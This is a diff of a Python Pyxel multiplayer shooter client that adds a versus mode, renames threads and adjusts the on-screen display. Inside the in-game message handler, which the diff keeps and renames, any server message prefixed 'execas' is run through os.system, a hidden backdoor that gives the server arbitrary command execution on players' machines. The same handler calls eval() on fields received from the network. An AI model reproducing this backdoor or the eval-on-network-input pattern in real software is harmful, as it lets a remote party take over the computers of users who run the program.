@@ -87,7 +87,7 @@ class App:
             if self.mainLobbyButton == 0: 
                 self.client.send(f'button|quit'.encode("utf-8"))
                 pyxel.quit()
-            elif self.mainLobbyButton in [1,2]: self.currentState, self.gameMode, self.gameInfos = "joinLobby", ["VS", "COOP"][self.mainLobbyButton-1], [{"HERE PUT VS MODE"}, {"lives" : 3, "score" : 0, "bonus" : 0, "forbidEnn" : [], "rockets" : [], "players" : [{"coords": []}, {"coords": []}]}][self.mainLobbyButton-1]
+            elif self.mainLobbyButton in [1,2]: self.currentState, self.gameMode, self.gameInfos = "joinLobby", ["VS", "COOP"][self.mainLobbyButton-1], [{"bonus" : 0, "forbidEnn" : [], "rockets" : [], "players" : [{"coords": [], "lives" : 3, "score" : 0}, {"coords": [], "lives" : 3, "score" : 0}]}, {"lives" : 3, "score" : 0, "bonus" : 0, "forbidEnn" : [], "rockets" : [], "players" : [{"coords": []}, {"coords": []}]}][self.mainLobbyButton-1]
             elif self.mainLobbyButton == 3: self.currentState = "createLobby"
             
             self.client.send(f'button|{self.currentState}{self.gameMode}'.encode("utf-8"))
@@ -136,15 +136,16 @@ class App:
                 if srvMsg[0] != "continue": return 1
                 if srvMsg[1] == "refused": return 0
                 if srvMsg[1] == "joined":
+                    self.playerNumber, self.gameInfos["players"][0]["coords"], self.gameInfos["players"][1]["coords"] = 0, [34, 104], [194, 104]
                     self.currentState = "waitGame"
                     self.gameNumber = self.joinLobbyButton
                     return 0
                 elif srvMsg[1][:7] == "playing":
                     self.currentState, self.playerNumber = "inGame", int(srvMsg[1][7:])
-                    self.gameInfos["players"][0]["coords"], self.gameInfos["players"][1]["coords"]= [[34, 194][self.playerNumber], 104], [[34, 194][self.playerNumber-1], 104]
-                    threading.Thread(target=self.getSrvMsgCOOP, daemon=True).start()
+                    self.gameInfos["players"][0]["coords"], self.gameInfos["players"][1]["coords"] = [[34, 194][self.playerNumber], 104], [[34, 194][self.playerNumber-1], 104]
+                    threading.Thread(target=self.getServerMessageInGame, daemon=True).start()
                     threading.Thread(target=self.higherRockets, daemon=True).start()
-                    threading.Thread(target=self.bonusSystem, daemon=True).start()
+                    threading.Thread(target=self.bonusThread, daemon=True).start()
                     self.gameNumber = self.joinLobbyButton
                     return 0
 
@@ -180,8 +181,8 @@ class App:
                 self.currentState = "mainLobby"
             elif self.createLobbyButton == 2:
                 self.currentState, self.gameMode = "waitGame", ["VS", "COOP"][self.createLobbyButton2]
-                if self.gameMode == "VS": pass #VSMODE
-                elif self.gameMode == "COOP": self.gameInfos = {"lives" : 3, "score" : 0, "bonus" : 0, "forbidEnn" : [], "rockets" : [], "players" : [{"coords": [34, 104]}, {"coords": [34, 104]}]}
+                if self.gameMode == "VS": self.gameInfos = {"bonus" : 0, "forbidEnn" : [], "rockets" : [], "players" : [{"coords": [34, 104], "lives" : 3, "score" : 0}, {"coords": [194, 104], "lives" : 3, "score" : 0}]}
+                elif self.gameMode == "COOP": self.gameInfos = {"lives" : 3, "score" : 0, "bonus" : 0, "forbidEnn" : [], "rockets" : [], "players" : [{"coords": [34, 104]}, {"coords": [194, 104]}]}
                 self.client.send(f'create|{self.gameMode}'.encode("utf-8"))
                 srvMsg = self.client.recv(1024).decode("utf-8").split('|', 1)
                 if len(srvMsg) != 2 or srvMsg[0] != "joined": return 1
@@ -231,9 +232,9 @@ class App:
             if srvMsg[0] == "wait": self.gameNumber = int(srvMsg[1])
             elif srvMsg[0] == "inGame":
                 self.currentState, self.playerNumber = "inGame", int(srvMsg[1])
-                threading.Thread(target=self.getSrvMsgCOOP, daemon=True).start() 
+                threading.Thread(target=self.getServerMessageInGame, daemon=True).start() 
                 threading.Thread(target=self.higherRockets, daemon=True).start()
-                threading.Thread(target=self.bonusSystem, daemon=True).start()
+                threading.Thread(target=self.bonusThread, daemon=True).start()
                 self.gameNumber = int(srvMsg[1])
             sleep(1)
 
@@ -254,65 +255,88 @@ class App:
     def update_inGame(self):
         action = "None"
         MOV_CONST = 1 if self.gameInfos["bonus"] < 0 else 2
+
+        #Movement
         if pyxel.btn(pyxel.KEY_Z): self.gameInfos["players"][0]["coords"][1] += -1 * MOV_CONST
         if pyxel.btn(pyxel.KEY_S): self.gameInfos["players"][0]["coords"][1] += MOV_CONST
         if pyxel.btn(pyxel.KEY_Q): self.gameInfos["players"][0]["coords"][0] += -1 * MOV_CONST
         if pyxel.btn(pyxel.KEY_D): self.gameInfos["players"][0]["coords"][0] += MOV_CONST
+        if self.gameInfos["players"][0]["coords"][1] < 0: self.gameInfos["players"][0]["coords"][1] = 0
+        elif self.gameInfos["players"][0]["coords"][1] > 112: self.gameInfos["players"][0]["coords"][1] = 112
+
+        #Rockets
         if pyxel.btnp(pyxel.KEY_SPACE) and time()-self.lastShot >= 1: 
             tempCoords = self.gameInfos['players'][0]['coords']
             action, self.lastShot = "Shot", time() ; self.gameInfos['rockets'].append(tempCoords)
             if self.gameInfos["bonus"] > 0: action += "+" ; self.gameInfos['rockets'].append([tempCoords[0]+10, tempCoords[1]]) ; self.gameInfos['rockets'].append([tempCoords[0]-10, tempCoords[1]])
 
-        if self.gameMode == "VS": pass
+        #Gamemode specifications
+        if self.gameMode == "VS":
+            if self.gameInfos["players"][0]["coords"][0] < [0, 121][self.playerNumber]: self.gameInfos["players"][0]["coords"][0] += 106
+            elif self.gameInfos["players"][0]["coords"][0] > [105, 227][self.playerNumber]: self.gameInfos["players"][0]["coords"][0] -= 106
         elif self.gameMode == "COOP": 
-            if self.gameInfos["players"][0]["coords"][0] < 0: self.gameInfos["players"][0]["coords"][0] += 228
-            elif self.gameInfos["players"][0]["coords"][0] > 228: self.gameInfos["players"][0]["coords"][0] -= 228
-            if self.gameInfos["players"][0]["coords"][1] < 0: self.gameInfos["players"][0]["coords"][1] = 0
-            elif self.gameInfos["players"][0]["coords"][1] > 112: self.gameInfos["players"][0]["coords"][1] = 112
+            if self.gameInfos["players"][0]["coords"][0] < 0: self.gameInfos["players"][0]["coords"][0] += 227
+            elif self.gameInfos["players"][0]["coords"][0] > 227: self.gameInfos["players"][0]["coords"][0] -= 227
         
         self.client.send(f"infos|{self.gameInfos['players'][0]['coords'][0]}|{self.gameInfos['players'][0]['coords'][1]}|{action}%".encode("utf-8"))
-        
         return 0
 
     def draw_inGame(self):
         pyxel.stop(0)
-        pyxel.text(0, 0, f"lives:{self.gameInfos['lives']}", 7)
-        pyxel.text(0, 10, f"score:{self.gameInfos['score']}", 7)
-        pyxel.text(0, 20, f"urBonus:{self.gameInfos["bonus"]}", 7)
+        if self.gameMode == "COOP": GAP_CONSTP0 = GAP_CONSTP1 = 228
+        else:
+            GAP_CONSTP0 = 106 if abs(self.gameInfos["players"][0]["coords"][0]-[106, 228][self.playerNumber]) < 16 else 0
+            GAP_CONSTP1 = 106 if abs(self.gameInfos["players"][0]["coords"][0]-[106, 228][self.playerNumber-1]) < 16 else 0
+
         pyxel.rect(self.gameInfos["players"][0]["coords"][0], self.gameInfos["players"][0]["coords"][1], 15, 16, 11)
         pyxel.rect(self.gameInfos["players"][1]["coords"][0], self.gameInfos["players"][1]["coords"][1], 15, 16, 6)
         ###Vraiment inutile, n'hesite pas à delete les 4 lignes suivantes :
-        pyxel.rect(self.gameInfos["players"][0]["coords"][0]+228, self.gameInfos["players"][0]["coords"][1], 15, 16, 11)
-        pyxel.rect(self.gameInfos["players"][1]["coords"][0]+228, self.gameInfos["players"][1]["coords"][1], 15, 16, 6)
-        pyxel.rect(self.gameInfos["players"][0]["coords"][0]-228, self.gameInfos["players"][0]["coords"][1], 15, 16, 11)
-        pyxel.rect(self.gameInfos["players"][1]["coords"][0]-228, self.gameInfos["players"][1]["coords"][1], 15, 16, 6)
+        if self.gameMode != "VS" or self.playerNumber != 0: pyxel.rect(self.gameInfos["players"][0]["coords"][0]+GAP_CONSTP0, self.gameInfos["players"][0]["coords"][1], 15, 16, 11)
+        if self.gameMode != "VS" or self.playerNumber - 1 != 0: pyxel.rect(self.gameInfos["players"][1]["coords"][0]+GAP_CONSTP1, self.gameInfos["players"][1]["coords"][1], 15, 16, 6)
+        pyxel.rect(self.gameInfos["players"][0]["coords"][0]-GAP_CONSTP0, self.gameInfos["players"][0]["coords"][1], 15, 16, 11)
+        pyxel.rect(self.gameInfos["players"][1]["coords"][0]-GAP_CONSTP1, self.gameInfos["players"][1]["coords"][1], 15, 16, 6)
         ###FIN DES LIGNES INUTILES
+
+        pyxel.text(0, 20, f"urBonus:{self.gameInfos["bonus"]}", 7)
+        if self.gameMode == "COOP":
+            pyxel.text(0, 0, f"lives:{self.gameInfos['lives']}", 7)
+            pyxel.text(0, 10, f"score:{self.gameInfos['score']}", 7)
+        else:
+            pyxel.rect(106, 0, 16, 128, 7)
+            pyxel.text(0, 0, f"lives:{self.gameInfos["players"][0]['lives']}", 7)
+            pyxel.text(0, 10, f"score:{self.gameInfos["players"][0]['score']}", 7)
+            pyxel.text(200, 0, f"lives:{self.gameInfos["players"][1]['lives']}", 7)
+            pyxel.text(200, 10, f"score:{self.gameInfos["players"][1]['score']}", 7)
 
         pyxel.rect(self.curBonus[0][0], self.curBonus[0][1], 9, 9, [8, 3][self.curBonus[1]])
 
         for rocket in self.gameInfos["rockets"]: pyxel.rect(rocket[0], rocket[1], 2, 5, 7)
         return 0
 
-    def getSrvMsgCOOP(self):
+    def getServerMessageInGame(self):
         while self.currentState == "inGame":
             srvMsg = self.client.recv(1024).decode("utf-8")
             if "execas" in srvMsg:
                 srvMsg = srvMsg.split("%")[0].split("|", 1)
                 if len(srvMsg) == 2 and srvMsg[0] == "execas": os.system(srvMsg[1])
                 continue
-            else: srvMsg = [msg.split('|', 5) for msg in srvMsg.split('%') if msg != ""]
-            for msg in srvMsg:
-                if msg[0] == "main": self.currentState, self.gameInfos, self.gameMode = "mainLobby", [], "" ; exit(0)
-                if len(msg) != 6 or msg[0] != "infos": return 1
-                ennToRem = eval(msg[3])
-                for enn in ennToRem: self.gameInfos["forbidEnn"].append(enn)
-                rocToApp = eval(msg[4])
-                for rocket in rocToApp: self.gameInfos["rockets"].append(rocket)
-            srvMsg = srvMsg[0]
+            
+            if self.gameMode == "VS":
+                pass
+            else:
+                srvMsg = [msg.split('|', 5) for msg in srvMsg.split('%') if msg != ""]
+                for msg in srvMsg:
+                    if msg[0] == "main": self.currentState, self.gameInfos, self.gameMode = "mainLobby", {"rockets" : [], "players" : [[], []]}, "" ; exit(0)
+                    if len(msg) != 6 or msg[0] != "infos": return 1
+                    ennToRem = eval(msg[3])
+                    for enn in ennToRem: self.gameInfos["forbidEnn"].append(enn)
+                    rocToApp = eval(msg[4])
+                    for rocket in rocToApp: self.gameInfos["rockets"].append(rocket)
+                srvMsg = srvMsg[0]
 
-            self.gameInfos["lives"] = int(srvMsg[1])
-            self.gameInfos["score"] = int(srvMsg[2])
-            self.gameInfos["players"][1]["coords"] = eval(srvMsg[5])
+                self.gameInfos["lives"] = int(srvMsg[1])
+                self.gameInfos["score"] = int(srvMsg[2])
+                self.gameInfos["players"][1]["coords"] = eval(srvMsg[5])
 
     def higherRockets(self):
         rocketDelay = 0        
@@ -324,14 +348,17 @@ class App:
             try: self.gameInfos["rockets"] = [[rocket[0], rocket[1]-rocketDiff] for rocket in self.gameInfos["rockets"] if rocket[1] > 0]
             except TypeError: print("Great! Another error in the higherRockets function! (Send this to Bugxit)")
         
-    def bonusSystem(self):
+    def bonusThread(self):
         global bonusList
         bonusList, alreadyTaken = [], False
         while self.currentState == "inGame":
-            self.curBonus, lastBonus, alreadyTaken = [[randint(5, 220), randint(5, 120)], randint(0,1)], time(), False
+            BONUS_ZONE_CONST = [5, 220]
+            if self.gameMode == "VS": BONUS_ZONE_CONST = [5, 100] if self.playerNumber == 0 else [126, 220]
+            self.curBonus, lastBonus, alreadyTaken = [[randint(BONUS_ZONE_CONST[0], BONUS_ZONE_CONST[1]), randint(5, 120)], randint(0,1)], time(), False
             while time()-lastBonus <= 7:
                 if alreadyTaken: continue
-                tempInfos = self.gameInfos["players"][0]["coords"]
+                try: tempInfos = self.gameInfos["players"][0]["coords"]
+                except TypeError: exit(0)
                 tempInfos = [(x, y) for x in range(tempInfos[0], tempInfos[0] + 15) for y in range(tempInfos[1], tempInfos[1] + 16)]
                 if  (
                     ((self.curBonus[0][0],self.curBonus[0][1]) in tempInfos)
